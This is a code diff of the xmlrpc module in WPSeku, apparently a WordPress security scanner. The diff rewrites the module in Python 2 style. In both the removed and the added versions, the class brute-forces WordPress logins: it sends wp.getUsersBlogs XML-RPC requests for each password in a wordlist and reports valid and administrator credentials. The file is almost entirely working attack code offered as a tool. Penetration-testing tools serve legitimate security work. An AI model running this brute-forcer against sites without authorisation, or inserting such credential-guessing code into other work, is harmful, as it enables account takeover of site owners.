@@ -19,44 +19,38 @@
 # along with WPSeku; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
-import re
-
-from lib import wphttp, wpprint
-
+from lib import wphttp 
+from lib import wpprint
+import re 
 
 class wpxmlrpc:
-    check = wphttp.check()
-    printf = wpprint.wpprint()
+	check = wphttp.check()
+	printf = wpprint.wpprint()
+	def __init__(self,agent,proxy,redirect,url,cookie,wordlist,user):
+		self.url = url 
+		self.cookie = cookie 
+		self.wordlist = wordlist 
+		self.user = user
+		self.req = wphttp.wphttp(agent=agent,proxy=proxy,redirect=redirect)
 
-    def __init__(self, agent, proxy, redirect, url, cookie, wordlist, user):
-        self.url = url
-        self.cookie = cookie
-        self.wordlist = wordlist
-        self.user = user
-        self.req = wphttp.wphttp(agent=agent, proxy=proxy, redirect=redirect)
-
-    def run(self):
-        self.printf.test('Starting bruteforce login via xmlrpc...')
-        print("")
-        passwd = open(self.wordlist, "rb")
-        for x in passwd:
-            payload = ("""<methodCall><methodName>wp.getUsersBlogs</methodName><params>
-                <param><value><string>""" + self.user + """</string></value></param>
-                <param><value><string>""" + str(x).split('\n')[0] + """</string></value></param></params></methodCall>""")
-            self.printf.test("Trying Credentials: \"%s\" - \"%s\"" %
-                             (self.user, str(x).split('\n')[0]))
-            try:
-                url = self.check.checkurl(self.url, 'xmlrpc.php')
-                resp = self.req.send(url, method="POST", payload=payload)
-                html = resp.text
-                if re.search('<name>isAdmin</name><value><boolean>0</boolean>', html, re.I):
-                    self.printf.plus(
-                        'Valid Credentials: \"%s\" - \"%s\"' % (self.user, x.split('\n')[0]))
-                elif re.search('<name>isAdmin</name><value><boolean>1</boolean>', html, re.I):
-                    self.printf.plus(
-                        'Valid ADMIN Credentials: \"%s\" - \"%s\"' % (self.user, x.split('\n')[0]))
-                else:
-                    self.printf.erro(
-                        'Invalid Credentials: \"%s\" - \"%s\"' % (self.user, x.split('\n')[0]))
-            except Exception as error:
-                pass
+	def run(self):
+		self.printf.test('Starting bruteforce login via xmlrpc...')
+		print ""
+		passwd = open(self.wordlist,"rb")
+		for x in passwd:
+			payload = ("""<methodCall><methodName>wp.getUsersBlogs</methodName><params>
+				<param><value><string>"""+self.user+"""</string></value></param>
+				<param><value><string>"""+str(x.split('\n')[0])+"""</string></value></param></params></methodCall>""")
+			self.printf.test("Trying Credentials: \"%s\" - \"%s\""%(self.user,x.split('\n')[0]))
+			try:
+				url = self.check.checkurl(self.url,'xmlrpc.php')
+				resp = self.req.send(url,method="POST",payload=payload)
+				html = resp.read()
+				if re.search('<name>isAdmin</name><value><boolean>0</boolean>',html,re.I):
+					self.printf.plus('Valid Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
+				elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',html,re.I):
+					self.printf.plus('Valid ADMIN Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
+				else:
+					self.printf.erro('Invalid Credentials: \"%s\" - \"%s\"'%(self.user,x.split('\n')[0]))
+			except Exception as error:
+				pass
